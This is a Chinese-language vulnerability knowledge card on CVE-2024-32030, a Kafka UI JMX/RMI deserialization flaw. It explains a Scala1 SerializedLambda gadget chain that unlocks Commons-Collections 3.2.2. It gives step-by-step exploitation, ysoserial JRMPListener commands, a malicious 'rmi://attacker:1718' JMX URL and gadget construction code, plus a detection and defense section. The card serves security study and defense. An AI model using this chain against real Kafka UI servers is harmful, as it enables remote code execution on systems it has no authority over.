---
id: web-java-deser-kafka-ui-jmx-scala1-cc322-property-bypass
title: CVE-2024-32030 Kafka UI JMX RMI 反序列化：Scala SerializedLambda 链设置 enableUnsafeSerialization 绕过 CC 3.2.2
type: scenario
domain: web
path: web/java/deserialization
technique: kafka-ui-jmx-rmi-scala1-systemproperty-cc-bypass
aliases:
- CVE-2024-32030
- Scala1
- Kafka UI JMX
- SerializedLambda
- SystemProperties.addOne
- enableUnsafeSerialization
- CC 3.2.2 绕过
- ConcurrentSkipListMap gadget
tags:
- java
- deserialization
- scala
- kafka-ui
- jmx
- rmi
- commons-collections
- serializedlambda
- gadget
- cve-2024-32030
cve:
- CVE-2024-32030
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V296
  verified_at: '2026-11-08T08:40:02+08:00'
  notes: 已对照原文与14张图核对：JRMPListener Scala1 参数、Kafka UI 0.7.1 demo、Before:null→After:true、SerializedLambda 构造参数（捕获类 SystemProperties、impl 方法 addOne 的匿名函数、Tuple2 键值）、ConcurrentSkipListMap.readObject→cpr→Ordering 的 IterableOrdering.compare→View 的 Fill.next→elem 的 apply→SystemProperties.addOne→System.setProperty→CHM.putVal→casTabAt→Unsafe.compareAndSetReference 调用栈与截图 01-14 一致；CVE-2024-32030 与原文标题一致。未验证点：原文只分析到 enableUnsafeSerialization 置 true，最终 CC 命令执行未展示（卡片已注明后续由 CC 链承担）；未本机复现；frontmatter 无 sources/source_url；原文仅以 kafka-ui 0.7.1 复现，未给明确受影响区间，故未设置 affected_versions。
---

## 一句话结论

Kafka UI 的 JMX 监控功能允许用户指定任意 broker 的 JMX 地址，而 JMX 基于 RMI/Java 序列化；攻击者搭建恶意 JRMP listener 后，Kafka UI 连接时就会反序列化 Scala1 链——`ConcurrentSkipListMap.readObject → cpr → Ordering$IterableOrdering.compare → View$Fill.iterator.next → Function0.apply（SerializedLambda）→ SystemProperties.addOne → System.setProperty`，把 `org.apache.commons.collections.enableUnsafeSerialization` 置为 `true`，解除 Commons-Collections 3.2.2 的安全开关，随后 CC 链即可执行任意命令。

## 原理

- **Kafka UI 的 JMX/RMI 攻击面**：Kafka UI 允许为每个 Kafka cluster 配置 JMX host/port，连接时使用 `JMXConnectorFactory.newJMXConnector(new JMXServiceURL(...))`。JMX over RMI 在客户端会读取并反序列化服务端返回的对象；攻击者控制 JMX/RMI 服务端，就能把任意序列化流送回 Kafka UI 的 `ObjectInputStream.readObject()`。
- **Commons-Collections 3.2.2 的安全开关**：3.2.2 在 `InvokerTransformer`/`InstantiateTransformer` 等类的 `readObject` 中加入了 `org.apache.commons.collections.enableUnsafeSerialization` 系统属性检查；该属性默认 `null`，不是 `"true"` 就抛 `UnsupportedOperationException`，经典 CC 链因此被挡住。要恢复 CC 链，攻击者需要先在一次反序列化里把该属性写成 `true`。
- **Scala1 链的入口——ConcurrentSkipListMap**：exp 先用虚拟比较器 `(o1, o2) -> 1` 构造 `ConcurrentSkipListMap`，`put(view, 1)`、`put(view, 2)` 两次（比较器恒返回 1，相同对象也会被当成新键插入两个节点），再通过反射把 `comparator` 字段替换为 `scala.math.Ordering$IterableOrdering` 实例。反序列化时 `ConcurrentSkipListMap.readObject()` 读取键值对，第一个键之后 `prevKey != null`，第二个键到来时执行 `cpr(cmp, prevKey, k)` → `cmp.compare(prevKey, k)`。
- **Ordering$IterableOrdering → Iterator.next**：`Ordering$IterableOrdering.compare(x, y)` 对两个 `View$Fill` 键取迭代器并调用 `xe.next()`/`ye.next()`；`View$Fill` 的迭代器 `next()` 执行 `this.elem$4.apply()`，而 `elem$4` 就是构造 `View$Fill(n, Function0)` 时传入的 `Function0`。
- **SerializedLambda 重建 Function0**：`Function0` 不是普通对象，而是从 `java.lang.invoke.SerializedLambda` 反序列化得到的 lambda。exp 用反射构造：
  `new SerializedLambda(scala.sys.SystemProperties.class, "scala/Function0", "apply", "()Ljava/lang/Object;", MethodHandleInfo.REF_invokeStatic, "scala.sys.SystemProperties", "$anonfun$addOne$1", "(Lscala/Tuple2;)Ljava/lang/String;", "()Lscala/sys/SystemProperties;", new Object[]{ new Tuple2<>("org.apache.commons.collections.enableUnsafeSerialization", "true") })`。
  反序列化时 `SerializedLambda.readResolve()` 调用捕获类 `SystemProperties` 的 `$deserializeLambda$`，把 `$anonfun$addOne$1` 与捕获的 `Tuple2` 还原成可调用的 `Function0`。
- **SystemProperties.addOne → System.setProperty**：`scala.sys.SystemProperties.addOne(Tuple2 kv)` 内部 `wrapAccess(() -> System.setProperty(kv._1(), kv._2()))`；`apply()` 触发后走 `System.setProperty → Properties.setProperty → ConcurrentHashMap.put → putVal → casTabAt → Unsafe.compareAndSetReference`，把 `enableUnsafeSerialization` 写为 `"true"`。
- **为什么整条链成立**：`ConcurrentSkipListMap` 在反序列化时会用序列化流里的 `comparator` 做比较，而 `comparator` 字段被替换成了 Scala 的 `Ordering`；Scala 的 `Ordering` 会对 `View.Fill` 迭代，`View.Fill` 的 `Function0` 又是 `SerializedLambda` 重建的攻击者 lambda；最终调用到 `SystemProperties.addOne` 这一“任意系统属性写入” sink。Kafka UI 的 classpath 同时包含 Scala（Kafka 客户端依赖）与 Commons-Collections 3.2.2，两个条件恰好同时满足。
- **后续 CC 执行**：属性置 `true` 后，CC 3.2.2 的 `readObject` 检查通过；同一序列化流中后续的 CC gadget（或下一次反序列化）即可走 `InvokerTransformer`/`TemplatesImpl` 等经典链执行命令。原文重点分析 Scala 链，最终命令执行由 CC 链承担。

## 触发条件

- Kafka UI 版本提供 JMX 监控功能，且允许用户配置 JMX host/port（或攻击者能影响该配置/让 Kafka UI 连接恶意 broker）。
- Kafka UI 进程 classpath 同时存在 Scala 库与 `commons-collections-3.2.2`；Java 版本与 ysoserial fork 兼容（原文用 Java 8 编译）。
- Kafka UI 未设置 JEP 290 反序列化过滤器，或过滤器未拦截 `scala.*` / `org.apache.commons.collections.*`；`enableUnsafeSerialization` 未被预先置 `true`（或即使已置 true 也可直接打 CC）。
- 攻击者能提供一个恶意 JMX/RMI 服务端（JRMP listener），并让 Kafka UI 主动连接；网络可达。
- 原文以 kafka-ui 0.7.1 复现；具体受影响版本区间以官方公告为准。

## 利用步骤

1. **准备 ysoserial Scala1 fork**（Java 8）：
   `git clone https://github.com/artsploit/ysoserial/ && cd ysoserial && git checkout scala1 && mvn package -DskipTests=true`。
2. **启动恶意 JRMP listener**：
   `java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1718 Scala1 "org.apache.commons.collections.enableUnsafeSerialization:true"`。
3. **让 Kafka UI 连接**：在 Kafka UI 中新增/修改 Kafka cluster 的 JMX 地址为 `service:jmx:rmi:///jndi/rmi://attacker:1718/jmxrmi`，或诱导管理员连接到恶意 broker 的 JMX 端口。
4. **验证属性被改写**：Kafka UI 连接过程中反序列化 Scala1，`enableUnsafeSerialization` 由 `null` 变为 `true`（可用本地 demo 打印 `System.getProperty` 验证）。
5. **执行 CC 链**：属性解锁后，用同一/后续序列化流中的 Commons-Collections gadget 执行命令；若目标是单一 JRMP 请求，需要把 Scala 链与 CC 链按顺序组合在同一个 payload 中（确保属性先被设置）。

## PoC

原文复现用的 JRMP listener 与客户端连接（Java 8）：

```bash
# 恶意 JMX/RMI 服务端（ysoserial artsploit scala1 分支）
java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar \
  ysoserial.exploit.JRMPListener 1718 Scala1 \
  "org.apache.commons.collections.enableUnsafeSerialization:true"
```

```java
// 模拟 Kafka UI 连接 JMX 的客户端 demo
String jmxUrl = "service:jmx:rmi:///jndi/rmi://192.168.85.129:1718/jmxrmi";
System.out.println("Before:" + System.getProperty("org.apache.commons.collections.enableUnsafeSerialization"));
JMXConnector connector = JMXConnectorFactory.newJMXConnector(new JMXServiceURL(jmxUrl), null);
connector.connect();
System.out.println("After:" + System.getProperty("org.apache.commons.collections.enableUnsafeSerialization"));
// 预期：Before:null / After:true
```

核心 SerializedLambda 构造（Scala1 的关键 gadget）：

```java
Tuple2<String, String> prop = new Tuple2<>(
    "org.apache.commons.collections.enableUnsafeSerialization", "true");

SerializedLambda lambda = new SerializedLambda(
    scala.sys.SystemProperties.class,
    "scala/Function0", "apply", "()Ljava/lang/Object;",
    MethodHandleInfo.REF_invokeStatic,
    "scala.sys.SystemProperties", "$anonfun$addOne$1",
    "(Lscala/Tuple2;)Ljava/lang/String;",
    "()Lscala/sys/SystemProperties;",
    new Object[]{ prop });
```

## 变体与关联

- **变体**：`SerializedLambda` 可替换成其他可序列化 lambda 的捕获类/impl 方法，把 sink 换成任意静态方法；`ConcurrentSkipListMap` 也可换成其他会在 `readObject` 中调用比较器/迭代器的集合；属性写入 sink 也可换成 `System.setProperties`、日志配置等。
- **关联卡片**：[[web-java-deser-serializedlambda-multiinterface-proxy-gadget]]（另一条 SerializedLambda 构造可序列化匿名类的链，走 Hutool/Spring XML）；[[web-java-deser-commonscollections-322-jsonobject-getter-bypass]]（CC 3.2.2 禁用 Transformer 后的另一种绕过）；[[web-java-deser-commonscollections-cc1-transformedmap]]、[[web-java-deser-commonscollections-cc6-hashmap-hashset-invokertransformer]]（属性解锁后的 CC 执行链）；[[web-java-deser-hibernate-activatableref-jrmp-secondary-bypass]]（JRMP 二次反序列化绕过类名黑名单）。
- **区分**：本卡的核心是 Kafka UI JMX/RMI 入口 + Scala1 链写系统属性解锁 CC 3.2.2，不是单条 CC gadget。

## 检测与防御

- **产品层**：升级 Kafka UI 到修复版本；限制 JMX 监控只能连接白名单内的 broker/JMX 地址，禁止用户任意填写外部 host:port；对 JMX 启用认证/TLS，或关闭远程 JMX 监控。
- **反序列化防护**：对 JMX/RMI 客户端设置 JEP 290 `ObjectInputFilter`，拒绝 `scala.*`、`org.apache.commons.collections.*`、`java.lang.invoke.SerializedLambda` 等高风险类；不要为了兼容 CC 3.2.2 而全局设置 `enableUnsafeSerialization=true`。
- **检测特征**：Kafka UI 进程发起对外部主机 1718/1099 等 RMI 端口的连接；反序列化流中出现 `scala.collection.View$Fill`、`scala.math.Ordering$IterableOrdering`、`scala.sys.SystemProperties`、`java.lang.invoke.SerializedLambda`；进程内系统属性 `org.apache.commons.collections.enableUnsafeSerialization` 被改为 true。
- **运营**：限制 Kafka UI 的出站网络；对 JMX/RMI 连接做资产与流量审计；Java 进程启用 `-Djdk.serialFilter` 白名单。
